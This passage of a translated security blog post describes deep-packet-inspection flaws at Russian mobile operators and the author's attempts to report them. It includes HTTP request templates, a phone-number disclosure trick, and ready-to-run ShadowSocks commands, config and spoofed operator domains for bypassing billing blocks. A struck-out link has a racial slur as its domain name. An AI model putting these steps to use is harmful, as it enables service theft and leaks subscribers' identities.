class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> &lt; HTTP/1.0 200 OK<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Content-Type: application/octet-stream<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> &lt; ignore<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span></code> </pre></div></div><br>  In addition, in the MTS DPI, the processing of HTTP request headers is incorrectly implemented, and the disclosure of a phone number can be exploited from the browser.  In the request, you need to add the <b>X-Host: pda.mts.ru header</b> using Javascript, and ‚Äúcut‚Äù the request exactly so that the ‚Äú <b>X-</b> ‚Äù remains in one package, and the other begins with ‚Äú <b>Host:</b> ‚Äù.  This can be done by manipulating the TCP Window Size on the server side. <br><br><h2>  Internet blocking bypass </h2><br>  With a negative balance and connected Internet options, which implies blocking access when the included traffic package is exhausted, the operators redirect all HTTP requests to their own stub pages, usually located on the subdomains of the main domain of the operator.  For MTS, Beeline and Megaphone, the ability to access the site is checked by comparing the <b>Host</b> HTTP header, and the IP address is not checked.  The same thing happened with Tele2, before the DPI reconfigured. <br><br>  HTTP requests to any IP address and port 80 with the <b>Host</b> header pointing to the service domain do not consume traffic from the packet and work even with a negative balance. <br>  Empirically, it was found that to establish a two-way exchange and bypass blocking, it is enough to send a <b>POST</b> request with a large <b>Content-Length</b> value, and also include the <b>Content-Length</b> in the server response: <br><br><pre> <code class="hljs pgsql"> : &gt;&gt;&gt; POST / HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span>\r\n Host: %s\r\n <span class="hljs-keyword"><span class="hljs-keyword">User</span></span>-Agent: Firefox/<span class="hljs-number"><span class="hljs-number">50.0</span></span>\r\n <span class="hljs-keyword"><span class="hljs-keyword">Connection</span></span>: keep-alive\r\n Content-<span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: multipart/form-data; boundary=fbfbfb\r\n Content-Length: <span class="hljs-number"><span class="hljs-number">999999999999</span></span>\r\n \r\n   : &gt;&gt;&gt; HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span> <span class="hljs-number"><span class="hljs-number">200</span></span> OK\r\n Content-Length: <span class="hljs-number"><span class="hljs-number">999999999999</span></span>\r\n \r\n</code> </pre><br>  After that, you can send arbitrary (non-HTTP) data in both directions. <br><br>  I made a <a href="https://pomf.pyonpyon.moe/gmtujc.patch">patch</a> to the ShadowSocks 2.5.6 proxy server, which adds these HTTP headers at the time of the connection: <br><br><ol><li>  Apply <a href="https://pomf.pyonpyon.moe/gmtujc.patch">patch</a> compile </li><li>  Create <code>/etc/shadowsocks.conf</code> file on the server (see below) </li><li>  Start <code>ss-server</code> on server: <code>ss-server -c /etc/shadowsocks.conf</code> </li><li>  Run <code>ss-local</code> on a device with 3G / LTE connection: <br> <code>ss-local -s SERVERIP -p 80 -l 1081 -m table -k verysecretpassword -H DOMAIN</code> <br>  where <code>DOMAIN</code> : <br>  <b>unblock.mts.ru</b> or <b>bonus.mts.ru</b> for MTS <br>  <b>corp.megafon.ru</b> for Megaphone <br>  <b>balance.beeline.ru</b> for Beeline </li><li>  Configure your browser and other programs on Socks5 proxy <code>127.0.0.1:1081</code> <br>  Or use ss-redir via iptables </li></ol><br>  <i>/etc/shadowsocks.conf</i> <br><br><pre> <code class="hljs json">{ <span class="hljs-attr"><span class="hljs-attr">"server"</span></span>:<span class="hljs-string"><span class="hljs-string">"0.0.0.0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"server_port"</span></span>:<span class="hljs-number"><span class="hljs-number">80</span></span>, <span class="hljs-attr"><span class="hljs-attr">"password"</span></span>:<span class="hljs-string"><span class="hljs-string">"verysecretpassword"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"method"</span></span>:<span class="hljs-string"><span class="hljs-string">"table"</span></span>, }</code> </pre><br><h2>  Provider Alert </h2><br>  In early December 2016, I tried to contact technical support from all four operators to report a problem.  I didn‚Äôt want to disclose the details of free Internet for free, so I was expecting a reward for the reported vulnerability.  So that everything is honest, and to confirm that I am not some kind of dupe asking for money, web vulnerabilities have been found that are not related to DPI: Beeline has access to the personal account from the attacker's website, without entering a login and password, MTS - disclosure of phone number, balance and tariff from the site of the attacker. <br><br>  MTS and Beeline refused to work with anonymous clients, so exactly a year ago, on December 29, 2016, a personal meeting was organized with representatives of the MTS and Beeline security services, where they were given all the details of the web vulnerabilities.  It was proposed to conclude a contract to search for vulnerabilities in DPI, if that suits them. <br><br>  During 2017, I repeatedly contacted MTS and Beeline to clarify how things are progressing with the closure of web vulnerabilities, but did not receive a response.  I wrote from different email addresses to eliminate technical problems with mail delivery, as well as personal messages on Twitter. <br><br>  Beeline ‚Äúcovered up‚Äù the vulnerability only at the end of October - made it impossible to be exploited through a web browser, but any program installed on the phone can still get access to the personal account, find out the phone number, change the tariff, connect the options . <br><br>  MTS has not yet closed the vulnerability.  Any site can get your phone number. <br><br>  Megaphone responded to the first two messages, but later did not receive a response from them. <br><br>  The only one who pleased me was the representatives of Tele2.  They responded quickly and clearly, offered a monetary reward. <br><br><h2>  Conclusion </h2><br>  Any program that has Internet access on your phone with a SIM <b>Megaphone</b> can find out your location accurate to the base station, phone number, IMEI and IMSI.  With SIM <b>MTS,</b> it can receive your phone number, IMEI and IMSI identifiers, and <b>Beeline</b> will only allow you to open a phone number. <br><br>  The web site of the attacker, containing a specially designed request, will allow you to reveal your phone number on the <b>MTS</b> . <br><br>  Also, you should not forget about the vulnerability of web services of mobile operators that are not related to DPI: with <b>Beeline,</b> any program can access your personal account, find out your phone number, balance, tariff, connected options, and can manage them, and <b>MTS</b> - find out your phone number and balance. <br><br>  DPI can be dangerous.  Operators are reluctant to contact and fix vulnerabilities.  If you use MTS, Beeline or Megaphone, write complaints, spread rot to them. <br><br>  Explore and experiment! <br><br><h2>  Bonus </h2><br>  <s>Go to the site <a href="http://loudnigra.xyz/">loudnigra.xyz</a> from your mobile MTS and wait for the call!</s>  MTS fixed the web vulnerability on December 31, 2017.  The remaining vulnerabilities are still working. <br><br>  <sup>Free Internet and all these headers work even in the Ukrainian Kyivstar, the Serbian Telenor, the Latvian Tele2.</sup> </div><p>Source: <a href="https://habr.com/ru/post/345852/">https://habr.com/ru/post/345852/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../345842/index.html">Docker self-organizing service infrastructure</a></li>
<li><a href="../345844/index.html">Install and update the Let's encrypt certificate for Zimbra mail server</a></li>
<li><a href="../345846/index.html">Whose is the text, Linus or Greg?</a></li>
<li><a href="../345848/index.html">Simple system monitor on Flask</a></li>
<li><a href="../345850/index.html">Narrowband access for widespread adoption of the Internet of Things</a></li>
<li><a href="../345854/index.html">What to read on New Year's holidays</a></li>
<li><a href="../345856/index.html">Optimize the initialization stage of Django</a></li>
<li><a href="../345858/index.html">Russian AI Cup 2017 - the story of second place</a></li>
<li><a href="../345860/index.html">Where it is more profitable to buy currency: banks vs exchange</a></li>
<li><a href="../345864/index.html">Import and convert LinguaLeo vocabulary to Anki flashcards</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>